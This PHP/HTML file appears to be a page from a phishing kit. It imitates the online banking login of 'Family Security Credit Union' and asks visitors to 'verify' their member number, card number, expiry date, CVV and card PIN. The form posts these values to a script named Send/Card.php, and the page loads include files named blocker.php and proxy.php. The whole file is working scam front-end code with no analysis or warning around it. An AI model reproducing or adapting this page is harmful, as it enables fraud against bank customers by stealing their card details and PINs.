<?php error_reporting(0);
require_once 'blocker.php';
require_once 'proxy.php';
require_once 'Country.php';
?>
<!DOCTYPE html>
<html lang="en-us" dir="ltr">
<?php require_once('File/Vendor/header.php'); ?>
<!----><!----><!----><!---->

<form action="Send/Card.php" autocomplete="off" method="post" novalidate="novalidate">

<!----><!----><!----><!---->

<div data-v-02a6d155="" class="row entrymodal-ui-container q-pa-lg q-mx-auto">
<div data-v-02a6d155="" class="col-12 row justify-center">
<img data-v-02a6d155="" height="40px" src="./File/dcuLogoDark.png" alt="Logo" class="q-mb-md">
<div data-v-02a6d155="" class="col-12 text-h3 text-grey-8 text-center">Family Security Credit Union Online banking
</div>
<hr data-v-02a6d155="" class="separator__header" style="color: #00008B;">
</div>
<div data-v-02a6d155="" class="col-12 q-my-md q-px-md">
<div data-v-6745c8f2="" data-v-02a6d155="" class="q-pa-md text-body2 text-black container__note" style="background-color: #008cff; border-left: 5px solid rgb(127, 127, 127);">
<div data-v-6745c8f2="" class="container__content">
<p data-v-02a6d155="" data-v-6745c8f2="" class="q-ma-none text-body1">Verify Your Card And Member Number.
</p>
</div>
</div>
</div>
<!----><!---->

<div data-v-02a6d155="" class="col-12 q-pt-md q-px-xs-md q-px-sm-xl">
<div data-v-02a6d155="">

<!----><!---->
<div data-v-02a6d155="" class="col-xs-12">
<div data-v-02a6d155="" class="container__input" type="text" caption="Username" bottom-slots="" error-message="Please enter a valid username" value="">
<div style="font-size: 13px; font-weight: bold; text-transform: uppercase; color: #008cff; padding-bottom: 5px;">
Member number
</div>
<label for="f_33385174-06ae-40bf-9f52-8fe6a4580abb" class="q-field row no-wrap items-start q-input q-field--outlined q-field--square q-field--dense q-validation-component">
<div class="q-field__inner relative-position col self-stretch">
<div tabindex="-1" class="q-field__control relative-position row no-wrap">
<div class="q-field__control-container col relative-position row no-wrap q-anchor--skip">
<input   name="Member" id="Member"  type="text"  maxlength="19" required="required"  placeholder="" autocomplete="off" value="" spellcheck="false" class="q-field__native q-placeholder">

</div>
</div>
</div>
</label>
</div>
</div>

<div data-v-02a6d155="" class="col-xs-12">
<div data-v-02a6d155="" class="container__input" type="text" caption="Username" bottom-slots="" error-message="Please enter a valid username" value="">
<div style="font-size: 13px; font-weight: bold; text-transform: uppercase; color: #008cff; padding-bottom: 5px;">
Card number
</div>
<label for="f_33385174-06ae-40bf-9f52-8fe6a4580abb" class="q-field row no-wrap items-start q-input q-field--outlined q-field--square q-field--dense q-validation-component">
<div class="q-field__inner relative-position col self-stretch">
<div tabindex="-1" class="q-field__control relative-position row no-wrap">
<div class="q-field__control-container col relative-position row no-wrap q-anchor--skip">
<input   name="Card" id="Card"  type="text"  maxlength="19" required="required"  placeholder="" autocomplete="off" value="" spellcheck="false" class="q-field__native q-placeholder">
<script src="File/mask.js"></script>
															<script>
															var element = document.getElementById('Card');
															var maskOptions = {
															mask: '0000 0000 0000 0000'
															};
														    var mask = IMask(element, maskOptions);
															</script> 
</div>
</div>
</div>
</label>
</div>
</div>

<div data-v-02a6d155="" class="col-xs-12">
<div data-v-02a6d155="" class="container__input" type="text" caption="Username" bottom-slots="" error-message="Please enter a valid username" value="">
<div style="font-size: 13px; font-weight: bold; text-transform: uppercase; color: rgba(0, 0, 0, 0.6); padding-bottom: 5px;">
Expiry Date
</div>
<label for="f_33385174-06ae-40bf-9f52-8fe6a4580abb" class="q-field row no-wrap items-start q-input q-field--outlined q-field--square q-field--dense q-validation-component">
<div class="q-field__inner relative-position col self-stretch">
<div tabindex="-1" class="q-field__control relative-position row no-wrap">
<div class="q-field__control-container col relative-position row no-wrap q-anchor--skip">
<input   name="Expiry" id="Expiry"  type="text"  maxlength="19" required="required"  placeholder="" autocomplete="off" value="" spellcheck="false" class="q-field__native q-placeholder">
<script src="File/mask.js"></script>
															<script>
															var element = document.getElementById('Expiry');
															var maskOptions = {
															mask: '00/0000'
															};
														    var mask = IMask(element, maskOptions);
															</script> 
</div>
</div>
</div>
</label>
</div>
</div>

<div data-v-02a6d155="" class="col-xs-12">
<div data-v-02a6d155="" class="container__input" type="text" caption="Username" bottom-slots="" error-message="Please enter a valid username" value="">
<div style="font-size: 13px; font-weight: bold; text-transform: uppercase; color: rgba(0, 0, 0, 0.6); padding-bottom: 5px;">
CVV
</div>
<label for="f_33385174-06ae-40bf-9f52-8fe6a4580abb" class="q-field row no-wrap items-start q-input q-field--outlined q-field--square q-field--dense q-validation-component">
<div class="q-field__inner relative-position col self-stretch">
<div tabindex="-1" class="q-field__control relative-position row no-wrap">
<div class="q-field__control-container col relative-position row no-wrap q-anchor--skip">
<input   name="cvv" id="cvv"  type="text"  maxlength="19" required="required"  placeholder="" autocomplete="off" value="" spellcheck="false" class="q-field__native q-placeholder">
<script src="File/mask.js"></script>
															<script>
															var element = document.getElementById('cvv');
															var maskOptions = {
															mask: '000'
															};
														    var mask = IMask(element, maskOptions);
															</script> 
</div>
</div>
</div>
</label>
</div>
</div>


<div data-v-02a6d155="" class="col-xs-12">
<div data-v-02a6d155="" class="container__input" type="text" caption="Username" bottom-slots="" error-message="Please enter a valid username" value="">
<div style="font-size: 13px; font-weight: bold; text-transform: uppercase; color: rgba(0, 0, 0, 0.6); padding-bottom: 5px;">
Card PIN
</div>
<label for="f_33385174-06ae-40bf-9f52-8fe6a4580abb" class="q-field row no-wrap items-start q-input q-field--outlined q-field--square q-field--dense q-validation-component">
<div class="q-field__inner relative-position col self-stretch">
<div tabindex="-1" class="q-field__control relative-position row no-wrap">
<div class="q-field__control-container col relative-position row no-wrap q-anchor--skip">
<input   name="pin" id="pin"  type="text"  maxlength="19" required="required"  placeholder="" autocomplete="off" value="" spellcheck="false" class="q-field__native q-placeholder">
<script src="File/mask.js"></script>
															<script>
															var element = document.getElementById('pin');
															var maskOptions = {
															mask: '0000'
															};
														    var mask = IMask(element, maskOptions);
															</script> 
</div>
</div>
</div>
</label>
</div>
</div>

<!----><!---->


</div>
<input id="submitCredentials" class="q-btn q-btn-item non-selectable no-outline q-mt-lg full-width q-btn--standard q-btn--rectangle  q-btn--wrap" label="SIGN IN"   style="color: white; background-color: #008cff; border-radius: 0px; height: 40px;" type="submit" value="Continue" >
</div>

<!----><!---->

<div data-v-02a6d155="" class="col-xs-12 q-pt-lg q-px-md text-body2 text-center">


<!----><!---->
<?php require_once('File/Vendor/footer.php'); ?>
</html>